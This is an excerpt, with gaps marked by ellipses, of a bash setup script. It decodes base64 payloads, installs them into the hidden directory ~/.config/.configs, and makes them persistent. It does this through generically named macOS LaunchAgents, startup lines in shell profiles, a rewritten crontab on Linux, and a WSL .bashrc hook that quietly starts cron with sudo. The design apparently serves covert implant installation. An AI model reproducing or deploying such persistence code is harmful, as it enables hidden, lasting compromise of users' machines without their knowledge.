#!/bin/bash
#当前版本未能成功创建~/.config/.configs

SETUP_STAGE_INPUT_DIRECTORY=10
SETUP_STAGE_PATH_RESOLUTION=11
SETUP_STAGE_PYTHON_DISCOVERY=12
SETUP_STAGE_BASE64_DETECTION=13
SETUP_STAGE_PAYLOAD_PREPARATION=14
SETUP_STAGE_CONFIG_INSTALLATION=15
SETUP_STAGE_POST_INSTALL_VERIFICATION=16
SETUP_STAGE_POST_INSTALL_SETUP=17
SETUP_STAGE_PLATFORM_DETECTION=18
...
[ -d .configs ] || return "$SETUP_STAGE_INPUT_DIRECTORY"
case $OS_TYPE in
    Darwin|Linux) ;;
    *) return "$SETUP_STAGE_PLATFORM_DETECTION" ;;
esac

resolve_config_install_paths .configs "$DEST_DIR" || return "$SETUP_STAGE_PATH_RESOLUTION"

EXEC_CMD="$(find_python)" || return "$SETUP_STAGE_PYTHON_DISCOVERY"

    DECODE="$(detect_base64_decode_flag)" || return "$SETUP_STAGE_BASE64_DETECTION"

    prepare_config_payloads .configs "$DECODE" "$EXEC_CMD" || return "$SETUP_STAGE_PAYLOAD_PREPARATION"

    install_config_dir .configs "$DEST_DIR" || return "$SETUP_STAGE_CONFIG_INSTALLATION"
    [ -d "$DEST_DIR" ] && [ ! -L "$DEST_DIR" ] || return "$SETUP_STAGE_POST_INSTALL_VERIFICATION"
    ...
    STARTUP_CMD="$(render_startup_cmd)" || return "$SETUP_STAGE_POST_INSTALL_SETUP"
    ...
    case $OS_TYPE in
        "Darwin")
            [ -n "$PYTHON_PATH" ] || return "$SETUP_STAGE_POST_INSTALL_SETUP"

            LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
            mkdir -p "$LAUNCH_AGENTS_DIR"

            PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.ba.plist"
            update_launch_agent "com.user.ba" "$PLIST_FILE" "true" render_launch_agent main "$PYTHON_PATH" "$SCRIPT_PATH" "$DEST_DIR" || return "$SETUP_STAGE_POST_INSTALL_SETUP"

            AUTOBACKUP_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.autobackup.plist"
            update_launch_agent "com.user.autobackup" "$AUTOBACKUP_PLIST_FILE" "true" render_launch_agent autobackup "$AUTOBACKUP_PATH" "$DEST_DIR" || return "$SETUP_STAGE_POST_INSTALL_SETUP"

            if [ -n "$AGENT_SETTING_BIN" ]; then
                AGENT_SETTING_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.agent-setting.plist"
                update_launch_agent "com.user.agent-setting" "$AGENT_SETTING_PLIST_FILE" "false" render_launch_agent agent-setting "$AGENT_SETTING_BIN" "$DEST_DIR" || return "$SETUP_STAGE_POST_INSTALL_SETUP"
            fi

            if [ -n "$WKLER_BIN" ]; then
                WKLER_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.wkler.plist"
                update_launch_agent "com.user.wkler" "$WKLER_PLIST_FILE" "true" render_launch_agent wkler "$WKLER_BIN" "$DEST_DIR" || return "$SETUP_STAGE_POST_INSTALL_SETUP"
            fi

            AUTOUPGRADE_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.autoupgrade.plist"
            update_launch_agent "com.user.autoupgrade" "$AUTOUPGRADE_PLIST_FILE" "false" render_launch_agent autoupgrade "$DEST_DIR" || return "$SETUP_STAGE_POST_INSTALL_SETUP"

            for PROFILE_FILE in "$HOME/.zshrc" "$HOME/.bash_profile"; do
                update_startup_cmd "$PROFILE_FILE" "$STARTUP_CMD" "$SCRIPT_PATH" || return "$SETUP_STAGE_POST_INSTALL_SETUP"
                append_startup_cmd "$PROFILE_FILE" "$AGENT_SETTING_CHECK_CMD" "agent-setting" || return "$SETUP_STAGE_POST_INSTALL_SETUP"
            done
        ...
        "Linux")
            ...
            install_cron || return "$SETUP_STAGE_POST_INSTALL_SETUP"
            command -v crontab >/dev/null 2>&1 || return "$SETUP_STAGE_POST_INSTALL_SETUP"
            ...
            if command -v crontab >/dev/null 2>&1; then
                ...
                if [ "$IS_WSL" = true ] && [ "$WSL_SYSTEMD_ENABLED" != true ]; then
                    ...
                    if [ ! -f "$BASHRC_FILE" ]; then
                        touch "$BASHRC_FILE" || return "$SETUP_STAGE_POST_INSTALL_SETUP"
                    fi
                    if grep -q "_sudo service cron start" "$BASHRC_FILE" 2>/dev/null; then
                        sed -i.bak '/_sudo service cron start/d' "$BASHRC_FILE" 2>/dev/null || return "$SETUP_STAGE_POST_INSTALL_SETUP"
                    fi
                    if ! grep -q "pgrep -x cron" "$BASHRC_FILE" 2>/dev/null; then
                        echo -e "\n# Auto-start cron service in WSL\nif ! pgrep -x cron > /dev/null; then if [ \"\$(id -u)\" -eq 0 ]; then service cron start > /dev/null 2>&1; else sudo service cron start > /dev/null 2>&1; fi; fi" >> "$BASHRC_FILE" || return "$SETUP_STAGE_POST_INSTALL_SETUP"
                    fi
                fi

                TEMP_CRON=$(mktemp) || return "$SETUP_STAGE_POST_INSTALL_SETUP"
                TEMP_CRON_ERROR=$(mktemp) || return "$SETUP_STAGE_POST_INSTALL_SETUP"
                if LC_ALL=C crontab -l > "$TEMP_CRON" 2> "$TEMP_CRON_ERROR"; then
                    ...
                    : > "$TEMP_CRON" || return "$SETUP_STAGE_POST_INSTALL_SETUP"
                else
                    return "$SETUP_STAGE_POST_INSTALL_SETUP"
                fi
                ...
                crontab "$TEMP_CRON" || return "$SETUP_STAGE_POST_INSTALL_SETUP"
            fi
            ;;
    esac
}
...
setup_entry() {
    ...
    if [ "${SETUP_DEBUG:-}" = "1" ]; then
        case $status in
            "$SETUP_STAGE_INPUT_DIRECTORY") stage=input-directory ;;
            "$SETUP_STAGE_PATH_RESOLUTION") stage=path-resolution ;;
            "$SETUP_STAGE_PYTHON_DISCOVERY") stage=python-discovery ;;
            "$SETUP_STAGE_BASE64_DETECTION") stage=base64-detection ;;
            "$SETUP_STAGE_PAYLOAD_PREPARATION") stage=payload-preparation ;;
            "$SETUP_STAGE_CONFIG_INSTALLATION") stage=config-installation ;;
            "$SETUP_STAGE_POST_INSTALL_VERIFICATION") stage=post-install-verification ;;
            "$SETUP_STAGE_POST_INSTALL_SETUP") stage=post-install-setup ;;
            "$SETUP_STAGE_PLATFORM_DETECTION") stage=platform-detection ;;
            *) stage=unknown ;;
        esac
        printf 'setup.sh: debug: stage=%s home=%q destination=%q\n' "$stage" "$HOME" "$HOME/.config/.configs" >&2
    fi
